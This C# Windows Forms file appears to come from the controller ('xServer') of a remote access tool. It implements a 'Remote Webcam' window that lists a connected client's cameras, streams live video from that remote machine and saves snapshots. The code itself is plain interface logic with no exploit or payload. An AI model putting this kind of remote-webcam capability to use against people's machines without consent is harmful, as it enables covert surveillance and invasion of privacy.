using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.Linq;
using System.Windows.Forms;
using xServer.Core.Helper;
using xServer.Core.Networking;

namespace xServer.Forms
{
    public partial class FrmRemoteWebcam : Form
    {

        public bool IsStarted { get; private set; }
        private readonly Client _connectClient;
        private Dictionary<string, List<Size>> _webcams;

        public FrmRemoteWebcam(Client c)
        {
            _connectClient = c;
            _connectClient.Value.FrmWebcam = this;

            InitializeComponent();
        }

        private void FrmRemoteWebcam_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Remote Webcam", _connectClient);

            stopMenuItem.Enabled = false;

            if (_connectClient.Value != null)
                new Core.Packets.ServerPackets.GetWebcams().Execute(_connectClient);
        }
        public void AddWebcams(Dictionary<string, List<Size>> webcams)
        {
            this._webcams = webcams;
            try
            {
                cbWebcams.Invoke((MethodInvoker)delegate
                {
                    foreach (var webcam in webcams.Keys)
                    {
                        cbWebcams.Items.Add(string.Format("{0}", webcam));
                    }
                    cbWebcams.SelectedIndex = 0;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }
        public void UpdateImage(Bitmap bmp, bool cloneBitmap = false)
        {
            picWebcam.Image = new Bitmap(bmp, picWebcam.Width, picWebcam.Height);
        }

        public void ToggleControls(bool state)
        {
            IsStarted = !state;

            cbWebcams.Enabled = cbResolutions.Enabled = startMenuItem.Enabled = state;
            stopMenuItem.Enabled = !state;
        }

        private void FrmRemoteWebcam_FormClosing(object sender, FormClosingEventArgs e)
        {
            new Core.Packets.ServerPackets.DoWebcamStop().Execute(_connectClient);

            if (_connectClient.Value != null)
                _connectClient.Value.FrmWebcam = null;
        }

        private void cbWebcams_SelectedIndexChanged(object sender, EventArgs e)
        {
            cbResolutions.Invoke((MethodInvoker)delegate
            {
                cbResolutions.Items.Clear();
                foreach (var resolution in this._webcams.ElementAt(cbWebcams.SelectedIndex).Value)
                {
                    cbResolutions.Items.Add(string.Format("{0} x {1}", resolution.Width, resolution.Height));
                }
                cbResolutions.SelectedIndex = 0;
            });
        }

        private void closeMenuItem_Click(object sender, EventArgs e)
        {
            ActiveForm.Close();            
        }

        private void startMenuItem_Click(object sender, EventArgs e)
        {
            if (cbWebcams.Items.Count == 0)
            {
                MessageBox.Show("No webcam detected.\nPlease wait till the client sends a list with available webcams.",
                    "Starting failed", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                return;
            }

            ToggleControls(false);

            this.ActiveControl = picWebcam;

            new Core.Packets.ServerPackets.GetWebcam(cbWebcams.SelectedIndex, cbResolutions.SelectedIndex).Execute(_connectClient);

        }

        private void stopMenuItem_Click(object sender, EventArgs e)
        {
            ToggleControls(true);
            this.ActiveControl = picWebcam;

            new Core.Packets.ServerPackets.DoWebcamStop().Execute(_connectClient);
        }

        private void webcamMenuItem_Click(object sender, EventArgs e)
        {
            cbWebcams.Focus();
        }

        private void resolutionMenuItem_Click(object sender, EventArgs e)
        {
            cbResolutions.Focus();
        }

        private void screenCaptureMenuItem_Click(object sender, EventArgs e)
        {           
            if (picWebcam.Image != null)
                savePicture();
        }
        private void savePicture()
        {
            using (SaveFileDialog sfdlg = new SaveFileDialog())
            {
                sfdlg.Title = "Screen Capture Save";
                sfdlg.Filter = "Joint Photographic Experts Group (*.jpeg)|*.jpg|Portable Network Graphics (*.png)|*.png|Tagged Image File Format (*.tif)|*.tif|Graphics Interchange Format (*.gif)|*.gif|Windows bitmap (*.bmp)|*.bmp|All files(*.*)|*.*";
                if (sfdlg.ShowDialog(this) == DialogResult.OK)
                {
                    switch (sfdlg.FilterIndex)
                    {
                        case 1:
                            picWebcam.Image.Save(@sfdlg.FileName, ImageFormat.Jpeg);
                            break;
                        case 2:
                            picWebcam.Image.Save(@sfdlg.FileName, ImageFormat.Png);
                            break;
                        case 3:
                            picWebcam.Image.Save(@sfdlg.FileName, ImageFormat.Tiff);
                            break;
                        case 4:
                            picWebcam.Image.Save(@sfdlg.FileName, ImageFormat.Gif);
                            break;
                        case 5:
                            picWebcam.Image.Save(@sfdlg.FileName, ImageFormat.Bmp);
                            break;
                        case 6:
                            picWebcam.Image.Save(@sfdlg.FileName);
                            break;
                    }
                }
            }
        }

    }
}
